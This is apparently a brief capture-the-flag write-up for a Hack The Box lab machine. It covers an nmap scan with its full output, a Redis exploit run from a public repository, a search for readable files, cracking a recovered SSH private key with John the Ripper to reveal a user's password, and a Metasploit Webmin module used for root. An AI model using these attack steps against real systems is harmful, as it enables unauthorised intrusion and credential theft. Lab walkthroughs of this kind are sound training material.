# 1 Nmap scan
sudo nmap -T5 -p- -A 10.10.10.160

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-02 20:36 CET
Warning: 10.10.10.160 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.10.160
Host is up (0.055s latency).
Not shown: 63183 closed ports, 2348 filtered ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 3.18 (94%), Linux 3.16 (93%), ASUS RT-N56U WAP (Linux 3.4) (93%), Oracle VM Server 3.4.2 (Linux 4.1) (93%), Android 4.1.1 (93%), Adtran 424RG FTTH gateway (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   54.71 ms 10.10.14.1
2   55.01 ms 10.10.10.160

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.97 seconds
```

# 2 exploiting redis 
[Avanash-acid repo][1]
```
python redis.py 10.10.10.160 redis
```
Doing a ls /home shows our target ***Matt***

# 3 pwning Matt

Listing readable files 
```
find / -type f -readable
```
download /opt/idrsa.bak 
```
ssh2jhon idrsa idrsa_jhon
zcat /usr/share/wordlists/rockyou.txt.gz |john --stdin idrsa_john (Matt:computer2008)
su Matt
```
# 4 pwning root

[metasploit linux/http/webmin_packageup_rce][2]   (authenticated exploit) 

[//]: Links
[1]: https://github.com/Avinash-acid/Redis-Server-Exploit
[2]: https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/linux/http/webmin_packageup_rce.md

![badge](https://www.hackthebox.eu/badge/image/272787)
